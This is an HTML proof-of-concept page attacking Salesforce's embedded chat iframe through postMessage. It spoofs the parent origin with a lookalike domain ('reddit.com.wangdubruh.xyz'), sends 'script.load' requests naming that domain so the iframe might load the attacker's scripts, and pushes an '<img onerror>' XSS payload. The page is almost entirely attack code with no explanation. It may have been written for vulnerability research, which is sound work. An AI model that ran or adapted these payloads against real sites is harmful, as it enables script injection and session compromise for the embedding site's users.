<!DOCTYPE html>
<html>
  <body>
    <iframe
      id="livechat"
      src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
      style="width: 100%; height: 600px;"
    ></iframe>

    <script>
      const iframe = document.getElementById("livechat");

      window.addEventListener("message", (e) => {
        console.log("ðŸ“© Message from iframe:", e.data);
      });

      iframe.onload = () => {
        console.log("[+] Iframe loaded (Salesforce 4.0)");

        // Try loading a valid feature
        const features = ["chasitor", "filetransfer"];

        features.forEach((feature) => {
          console.log("[ðŸ“¤] Sending script.load for feature:", feature);
          iframe.contentWindow.postMessage(
            {
              method: "script.load",
              domain: "reddit.com.wangdubruh.xyz",
            },
            "*"
          );
        });

        // Try sending payload if chasitor accepts custom data
        setTimeout(() => {
          iframe.contentWindow.postMessage(
            {
              method: "chasitor.fakeMethod",
              domain: "reddit.com.wangdubruh.xyz",
              data: {
                text: `<img src=x onerror=alert(document.domain)>`, // Payload
              },
            },
            "*"
          );
        }, 2000);
      };
    </script>
  </body>
</html>
